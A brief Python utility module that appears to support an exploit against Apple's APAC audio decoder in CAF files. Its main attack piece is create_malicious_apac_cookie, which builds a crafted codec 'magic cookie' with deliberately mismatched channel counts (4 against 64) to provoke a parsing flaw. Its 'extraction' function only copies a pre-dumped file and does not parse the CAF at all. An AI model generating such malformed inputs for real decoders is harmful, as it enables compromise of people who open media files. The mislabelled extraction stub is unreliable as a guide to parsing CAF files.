# caf_utils.py
import os
import struct
from pathlib import Path

def extract_magic_cookie_from_caf(caf_path: str, out_path: str) -> int:
    candidate = Path(caf_path).with_name("apac_hoa.dat")
    if candidate.exists():
        with open(candidate, "rb") as f:
            data = f.read()
        with open(out_path, "wb") as f:
            f.write(data)
        return len(data)
    
    raise RuntimeError("Cookie extraction requires pre-dumped apac_hoa.dat file")

def read_cookie_file(cookie_path: str) -> bytes:
    if not os.path.exists(cookie_path):
        raise FileNotFoundError(cookie_path)
    with open(cookie_path, "rb") as f:
        return f.read()

def create_malicious_apac_cookie() -> bytes:
    cookie_data = bytearray(256)
    
    cookie_data[0:4] = b"APAC"
    cookie_data[4:8] = struct.pack(">I", 48000)  # sample rate
    cookie_data[8:10] = struct.pack(">H", 4)     # channels in global layout
    cookie_data[16:18] = struct.pack(">H", 64)   # channels in remapping layout (mismatch!)
    
    for i in range(20, 84):
        cookie_data[i] = i - 20
    
    return bytes(cookie_data)